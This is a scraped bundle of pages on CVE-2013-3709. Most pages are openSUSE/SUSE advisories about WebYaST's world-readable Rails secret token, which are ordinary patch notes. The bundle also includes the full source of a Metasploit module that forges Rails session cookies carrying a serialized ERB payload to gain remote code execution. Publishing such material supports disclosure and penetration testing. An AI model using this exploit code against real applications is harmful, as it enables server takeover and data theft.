=== Content from lists.opensuse.org_5e72b252_20250124_170243.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/#O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE)

# [security-announce] openSUSE-SU-2013:1954-1: important: Fixes a local vulnerability

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

25 Dec
2013

25 Dec
'13

17:08

openSUSE Security Update: Fixes a local vulnerability
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2013:1954-1
Rating: important
References: #851116
Cross-References: CVE-2013-3709
Affected Products:
openSUSE 12.2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
Fixed CVE-2013-3709: make the secret token file
(secret\_token.rb) readable only for the webyast user to
avoid forging the session cookie (bnc#851116) (reported by
joernchen of Phenoelit)
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 12.2:
zypper in -t patch openSUSE-2013-1027
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 12.2 (noarch):
webyast-base-0.3.19.1-1.8.1
webyast-base-branding-default-0.3.19.1-1.8.1
webyast-base-testsuite-0.3.19.1-1.8.1
References:
<http://support.novell.com/security/cve/CVE-2013-3709.html>
<https://bugzilla.novell.com/851116>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE/#O72KFQTDTXZ5OS5CD5S3YP3QUW53UROE)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from lists.opensuse.org_51b9f1e7_20250124_170243.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/#CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ)

# [security-announce] SUSE-SU-2014:0022-1: important: Security update for WebYaST

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

6 Jan
2014

6 Jan
'14

15:04

SUSE Security Update: Security update for WebYaST
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2014:0022-1
Rating: important
References: #851116
Cross-References: CVE-2013-3709
Affected Products:
WebYaST 1.2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available. It
includes one version update.
Description:
In the past WebYAST was installed with world readable
secret tokens. Although these were modified on the start
of the webyast service and so could not be read from
remote, it was possible for local attackers on the same
machine to read the secrets and so gain local root access
via the webyast services. This has been fixed.
(CVE-2013-3709)
Security Issue reference:
\* CVE-2013-3709
<<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3709>

...

Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- WebYaST 1.2:
zypper in -t patch slewyst12-webyast-base-ui-8706
To bring your system up-to-date, use "zypper patch".
Package List:
- WebYaST 1.2 (noarch) [New Version: 0.2.64]:
webyast-base-ui-0.2.64-0.3.1
webyast-base-ui-branding-default-0.2.64-0.3.1
webyast-base-ui-testsuite-0.2.64-0.3.1
References:
<http://support.novell.com/security/cve/CVE-2013-3709.html>
<https://bugzilla.novell.com/851116>
[http://download.novell.com/patch/finder/?keywords=af7e4362e22d530ab6e447346f...](http://download.novell.com/patch/finder/?keywords=af7e4362e22d530ab6e447346f0afdfb)
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ/#CHVYPMBH4IZ4J6C7XDOSFTJUQWVIBKOZ)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from lists.opensuse.org_914b37e7_20250124_170243.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/#C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW)

# [security-announce] openSUSE-SU-2013:1961-1: important: Fixes a local vulnerability

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

25 Dec
2013

25 Dec
'13

17:10

openSUSE Security Update: Fixes a local vulnerability
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2013:1961-1
Rating: important
References: #851116
Cross-References: CVE-2013-3709
Affected Products:
openSUSE 13.1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
Fixed CVE-2013-3709: make the secret token file
(secret\_token.rb) readable only for the webyast user to
avoid forging the session cookie (bnc#851116) (reported by
joernchen of Phenoelit)
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.1:
zypper in -t patch openSUSE-2013-1029
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.1 (noarch):
webyast-base-0.3.45.1-2.4.1
webyast-base-branding-default-0.3.45.1-2.4.1
webyast-base-testsuite-0.3.45.1-2.4.1
References:
<http://support.novell.com/security/cve/CVE-2013-3709.html>
<https://bugzilla.novell.com/851116>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW/#C6BBYNZRBDO2CNNVTBOBLPW7KLAMQ2UW)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugzilla.novell.com_1f3afa8f_20250126_022706.html ===




=== Content from github.com_b1b67b51_20250124_170248.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fmulti%2Fhttp%2Frails_secret_deserialization.rb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fmulti%2Fhttp%2Frails_secret_deserialization.rb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  412](/rapid7/metasploit-framework/issues)
* [Pull requests
  42](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

## Files

 master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[multi](/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
5. /[http](/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http)
/
# rails\_secret\_deserialization.rb

Copy path Blame  Blame
## Latest commit

## History

[History](/rapid7/metasploit-framework/commits/master/modules/exploits/multi/http/rails_secret_deserialization.rb)275 lines (234 loc) · 8.73 KB master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[multi](/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
5. /[http](/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http)
/
# rails\_secret\_deserialization.rb

Top
## File metadata and controls

* Code
* Blame

275 lines (234 loc) · 8.73 KB[Raw](https://github.com/rapid7/metasploit-framework/raw/refs/heads/master/modules/exploits/multi/http/rails_secret_deserialization.rb)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##
class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking
 #Helper Classes copy/paste from Rails4 class MessageVerifier
 class InvalidSignature < StandardError; end
 def initialize(secret, options = {}) @secret = secret @digest = options[:digest] || 'SHA1' @serializer = options[:serializer] || Marshal end
 def generate(value) data = ::Base64.strict\_encode64(@serializer.dump(value)) "#{data}--#{generate\_digest(data)}" end
 def generate\_digest(data) require 'openssl' unless defined?(OpenSSL) OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const\_get(@digest).new, @secret, data) end
 end
 class MessageEncryptor
 module NullSerializer #:nodoc:
 def self.load(value) value end
 def self.dump(value) value end
 end
 class InvalidMessage < StandardError; end
 OpenSSLCipherError = OpenSSL::Cipher::CipherError
 def initialize(secret, \*signature\_key\_or\_options) options = signature\_key\_or\_options.extract\_options! sign\_secret = signature\_key\_or\_options.first @secret = secret @sign\_secret = sign\_secret @cipher = options[:cipher] || 'aes-256-cbc' @verifier = MessageVerifier.new(@sign\_secret || @secret, :serializer => NullSerializer) # @serializer = options[:serializer] || Marshal end
 def encrypt\_and\_sign(value) @verifier.generate(\_encrypt(value)) end
 def \_encrypt(value) cipher = new\_cipher cipher.encrypt cipher.key = @secret # Rely on OpenSSL for the initialization vector iv = cipher.random\_iv #encrypted\_data = cipher.update(@serializer.dump(value)) encrypted\_data = cipher.update(value) encrypted\_data << cipher.final [encrypted\_data, iv].map {|v| ::Base64.strict\_encode64(v)}.join("--") end
 def new\_cipher OpenSSL::Cipher.new(@cipher) end
 end
 class KeyGenerator
 def initialize(secret, options = {}) @secret = secret @iterations = options[:iterations] || 2\*\*16 end
 def generate\_key(salt, key\_size=64) OpenSSL::PKCS5.pbkdf2\_hmac\_sha1(@secret, salt, @iterations, key\_size) end
 end
 include Msf::Exploit::Remote::HttpClient
 def initialize(info = {}) super(update\_info(info, 'Name' => 'Ruby on Rails Known Secret Session Cookie Remote Code Execution', 'Description' => %q{ This module implements Remote Command Execution on Ruby on Rails applications. Prerequisite is knowledge of the "secret\_token" (Rails 2/3) or "secret\_key\_base" (Rails 4). The values for those can be usually found in the file "RAILS\_ROOT/config/initializers/secret\_token.rb". The module achieves RCE by deserialization of a crafted Ruby Object. }, 'Author' => [ 'joernchen of Phenoelit <joernchen[at]phenoelit.de>', ], 'License' => MSF\_LICENSE, 'References' => [ ['CVE', '2013-0156'], ['URL', 'http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/'] ], 'DisclosureDate' => '2013-04-11', 'Platform' => 'ruby', 'Arch' => ARCH\_RUBY, 'Privileged' => false, 'Targets' => [ ['Automatic', {} ] ], 'DefaultTarget' => 0))
 register\_options( [ Opt::RPORT(80), OptInt.new('RAILSVERSION', [ true, 'The target Rails Version (use 3 for Rails3 and 2, 4 for Rails4)', 3]), OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', "/"]), OptString.new('HTTP\_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', "GET"]), OptString.new('SECRET', [ true, 'The secret\_token (Rails3) or secret\_key\_base (Rails4) of the application (needed to sign the cookie)', nil]), OptString.new('COOKIE\_NAME', [ false, 'The name of the session cookie',nil]), OptString.new('DIGEST\_NAME', [ true, 'The digest type used to HMAC the session cookie','SHA1']), OptString.new('SALTENC', [ true, 'The encrypted cookie salt', 'encrypted cookie']), OptString.new('SALTSIG', [ true, 'The signed encrypted cookie salt', 'signed encrypted cookie']), OptBool.new('VALIDATE\_COOKIE', [ false, 'Only send the payload if the session cookie is validated', true]),
 ]) end
 # # This stub ensures that the payload runs outside of the Rails process # Otherwise, the session can be killed on timeout # def detached\_payload\_stub(code) %Q^ code = '#{ Rex::Text.encode\_base64(code) }'.unpack("m0").first if RUBY\_PLATFORM =~ /mswin|mingw|win32/ inp = IO.popen("ruby", "wb") rescue nil if inp inp.write(code) inp.close end else Kernel.fork do eval(code) end end {} ^.strip.split(/\n/).map{|line| line.strip}.join("\n") end
 def check\_secret(data, digest) data = Rex::Text.uri\_decode(data) if datastore['RAILSVERSION'] == 3 sigkey = datastore['SECRET'] elsif datastore['RAILSVERSION'] == 4 keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000}) sigkey = keygen.generate\_key(datastore['SALTSIG']) end digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(datastore['DIGEST\_NAME']), sigkey, data) end
 def rails\_4 keygen = KeyGenerator.new(datastore['SECRET'],{:iterations => 1000}) enckey = keygen.generate\_key(datastore['SALTENC']) sigkey = keygen.generate\_key(datastore['SALTSIG']) crypter = MessageEncryptor.new(enckey, sigkey) crypter.encrypt\_and\_sign(build\_cookie) end
 def rails\_3 # Sign it with the secret\_token data = build\_cookie digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new("SHA1"), datastore['SECRET'], data) marshal\_payload = Rex::Text.uri\_encode(data) "#{marshal\_payload}--#{digest}" end
 def build\_cookie
 # Embed the payload with the detached stub code = "eval('" + Rex::Text.encode\_base64(detached\_payload\_stub(payload.encoded)) + "'.unpack('m0').first)"
 if datastore['RAILSVERSION'] == 4 return "\x04\b" + "o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\b" + ":\x0E@instanceo" + ":\bERB\x07" + ":\t@src"+ Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\f@method:\vresult:" + "\x10@deprecatoro:\x1FActiveSupport::Deprecation\x00" end if datastore['RAILSVERSION'] == 3 return Rex::Text.encode\_base64 "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult" end end
 # # Send the actual request # def exploit if datastore['RAILSVERSION'] == 3 cookie = rails\_3 elsif datastore['RAILSVERSION'] == 4 cookie = rails\_4 end cookie\_name = datastore['COOKIE\_NAME']
 print\_status("Checking for cookie #{datastore['COOKIE\_NAME']}") res = send\_request\_cgi({ 'uri' => datastore['TARGETURI'] || "/", 'method' => datastore['HTTP\_METHOD'], }, 25) if res && !res.get\_cookies.empty? match = res.get\_cookies.match(/([.-\_A-Za-z0-9]+)=([A-Za-z0-9%]\*)--([0-9A-Fa-f]+);/) end
 if match if match[1] == datastore['COOKIE\_NAME'] print\_status("Found cookie, now checking for proper SECRET") else print\_status("Adjusting cookie name to #{match[1]}") cookie\_name = match[1] end
 if check\_secret(match[2],match[3]) print\_good("SECRET matches! Sending exploit payload") else fail\_with(Failure::BadConfig, "SECRET does not match, wrong RAILSVERSION?") end else print\_warning("Caution: Cookie not found, maybe you need to adjust TARGETURI") if cookie\_name.nil? || cookie\_name.empty? # This prevents trying to send busted cookies with no name fail\_with(Failure::BadConfig, "No cookie found and no name given") end if datastore['VALIDATE\_COOKIE'] fail\_with(Failure::BadConfig, "COOKIE not validated, unset VALIDATE\_COOKIE to send the payload anyway") else print\_status("Trying to leverage default controller without cookie confirmation.") end end
 print\_status "Sending cookie #{cookie\_name}" res = send\_request\_cgi({ 'uri' => datastore['TARGETURI'] || "/", 'method' => datastore['HTTP\_METHOD'], 'headers' => {'Cookie' => cookie\_name+"="+ cookie}, }, 25)
 handler endend

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.opensuse.org_d935f256_20250124_170242.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/#M7LMJML5HUV37OU6L57ANJVGX6HAYGLL)

# [security-announce] openSUSE-SU-2013:1952-1: important: Fixes a local vulnerability

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

25 Dec
2013

25 Dec
'13

17:04

openSUSE Security Update: Fixes a local vulnerability
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2013:1952-1
Rating: important
References: #851116
Cross-References: CVE-2013-3709
Affected Products:
openSUSE 12.3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
Fixed CVE-2013-3709: make the secret token file
(secret\_token.rb) readable only for the webyast user to
avoid forging the session cookie (bnc#851116)
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 12.3:
zypper in -t patch openSUSE-2013-1028
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 12.3 (noarch):
webyast-base-0.3.43.1-1.4.1
webyast-base-branding-default-0.3.43.1-1.4.1
webyast-base-testsuite-0.3.43.1-1.4.1
References:
<http://support.novell.com/security/cve/CVE-2013-3709.html>
<https://bugzilla.novell.com/851116>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/M7LMJML5HUV37OU6L57ANJVGX6HAYGLL/)
Use email software

